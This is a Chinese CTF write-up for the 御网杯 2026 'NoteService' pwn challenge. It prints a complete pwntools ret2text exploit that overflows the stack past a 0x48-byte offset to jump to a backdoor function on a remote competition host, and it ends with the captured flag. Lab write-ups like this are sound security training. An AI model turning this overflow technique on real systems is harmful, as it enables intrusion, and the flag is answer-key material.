---
title: "御网杯 PWN NoteService"
published: 2026-05-30T10:28:16+08:00
description: "无 canary、无额外限制，直接 ret2text 打后门。"
image: ""
tags: ["御网杯PWN2026", "Pwn", "Ret2text"]
category: "《御网杯PWN2026》"
categoryPath: ["《御网杯PWN2026》"]
series: "御网杯PWN2026"
draft: false
lang: "zh_CN"
---

附件：[`PWN-NoteService.docx`](/attachments/《御网杯PWN2026》/PWN-NoteService.docx)

题目附件截图：

![截图 1](/attachments/《御网杯PWN2026》/pwn-noteservice/01.png)

![截图 2](/attachments/《御网杯PWN2026》/pwn-noteservice/02.png)

题解记录：

这题直接走 `ret2text`，没有太多额外条件：

- 没有开启 `canary`
- 没有额外判断逻辑卡利用链
- 直接覆盖返回地址跳后门即可

原始 WP 中给出的 exp：

```python
from pwn import *

context(os="linux", terminal=["cmd.exe", "/c", "start"])

binary_path = "./vuln"
host = "47.99.147.34"  # 网址
port = 10858  # 端口

elf = ELF(binary_path, checksec=False)
context.binary = elf

if elf.bits == 64:
    context.arch = "amd64"
    gdbscript = """
    b *main
    c
    """
else:
    context.arch = "i386"
    gdbscript = """
    b *main
    c
    """

context.log_level = "debug"

if args.REMOTE:
    io = remote(host, port)
else:
    io = process(binary_path)


def p():
    pause()


backdoor = 0x401196
ret = 0x40101A

io.recv()
offset = 0x40 + 0x8
payload = flat([cyclic(offset), ret, backdoor])
io.sendline(payload)

io.interactive()
```

后续截图：

![截图 3](/attachments/《御网杯PWN2026》/pwn-noteservice/03.png)

![截图 4](/attachments/《御网杯PWN2026》/pwn-noteservice/04.png)

![截图 5](/attachments/《御网杯PWN2026》/pwn-noteservice/05.png)

原始记录中的 flag：

```text
flag{db35a83bde913ee94d6a7200849bb08a}
```
